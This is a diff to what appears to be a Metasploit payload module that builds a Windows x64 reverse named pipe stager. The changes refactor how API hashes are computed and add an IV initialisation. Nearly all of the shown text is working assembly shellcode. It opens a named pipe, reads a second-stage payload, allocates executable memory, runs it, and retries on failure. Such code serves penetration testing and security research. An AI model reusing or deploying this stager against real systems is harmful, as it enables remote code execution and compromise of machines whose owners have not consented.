@@ -54,6 +54,7 @@ module Payload::Windows::ReverseNamedPipe_x64
   # Generate and compile the stager
   #
   def generate_reverse_named_pipe(opts={})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     combined_asm = %Q^
       cld                     ; Clear the direction flag.
       and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
@@ -125,7 +126,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         xor r9, r9              ; lpSecurityAttributes
         xor r8, r8              ; dwShareMode
         mov rdx, 0xC0000000     ; dwDesiredAccess(GENERIC_READ|GENERIC_WRITE)
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'CreateFileA')}
         call rbp                ; CreateFileA(...)
 
       ; check for failure
@@ -145,7 +146,7 @@ module Payload::Windows::ReverseNamedPipe_x64
     else
       asm << %Q^
       failure:
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call rbp
       ^
     end
@@ -170,7 +171,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         push 0                  ; lpOverlapped
         mov rdx, rsi            ; lpBuffer
         mov rcx, rdi            ; hFile
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ReadFile')}
         call rbp                ; ReadFile(...)
     ^
 
@@ -199,7 +200,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly received second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         mov rbx, rax            ; rbx = our new memory address for the new stage
@@ -219,7 +220,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         mov rdx, rbx            ; lpBuffer
         push 0                  ; lpOverlapped
         mov rcx, rdi            ; hFile
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ReadFile')}
         call rbp                ; ReadFile(...)
         add rsp, 0x28           ; slight stack adjustment
     ^
@@ -239,14 +240,14 @@ module Payload::Windows::ReverseNamedPipe_x64
         pop r8                  ; dwFreeType
         push 0                  ; 0
         pop rdx                 ; dwSize
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualFree')}
         call rbp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
 
       cleanup_file:
       ; clean up the socket
         push rdi                ; file handle
         pop rcx                 ; hFile
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'CloseHandle')}
         call rbp
 
       ; and try again
